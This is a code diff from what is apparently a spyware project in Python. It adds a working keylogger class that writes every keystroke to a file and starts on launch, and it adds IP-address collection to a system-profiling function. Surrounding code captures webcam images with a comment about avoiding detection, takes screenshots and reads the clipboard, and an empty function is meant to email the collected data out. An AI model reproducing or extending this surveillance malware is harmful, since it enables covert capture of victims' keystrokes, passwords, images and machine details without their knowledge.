@@ -5,6 +5,27 @@ from PIL import ImageGrab
 import pyperclip
 import uuid
 import platform
+import socket
+
+
+class KeyLogger:
+    def __init__(self, filename: str = "keystrokes.txt") -> None:
+        self.filename = filename
+
+    @staticmethod
+    def get_chars(keystroke):
+        try:
+            return keystroke.char
+        except AttributeError:
+            return str(keystroke)
+
+    def on_press(self, keystroke):
+        with open(self.filename, 'a') as logs:
+            logs.write("Key Pressed =  \"" + self.get_chars(keystroke) + "\"\n")
+
+    def main(self):
+        listener = keyboard.Listener(on_press=self.on_press,)
+        listener.start()
 
 
 # Function to take an image from the webcam
@@ -19,11 +40,6 @@ def webcam_image():
     cv2.imwrite("webcam.png", image)
     # Deletes the variable so that webcam becomes unlocked (decreases chance of detection)
     del webcam
-
-
-def keylogger():
-    print("test")
-    # capture keystrokes and return them
 
 
 def take_screenshot():
@@ -48,10 +64,12 @@ def clipboard():
 def system_info():
     # gather platform data
     info = platform.uname()
-    # Get MAC_Address
+    # Get IP address
+    ip_address = socket.gethostbyname(socket.gethostname())
+    # Get MAC Address and format it correctly
     mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
     # Put all data in list
-    system_data = [info[1], info[5], platform.platform(), mac_address]
+    system_data = [info[1], info[5], platform.platform(), ip_address, mac_address]
     return system_data
 
 
@@ -60,4 +78,7 @@ def email():
     # gather all data from previous functions and email them to my address
 
 
-print(system_info())
+if __name__ == "__main__":
+    logger = KeyLogger()
+    logger.main()
+    input()
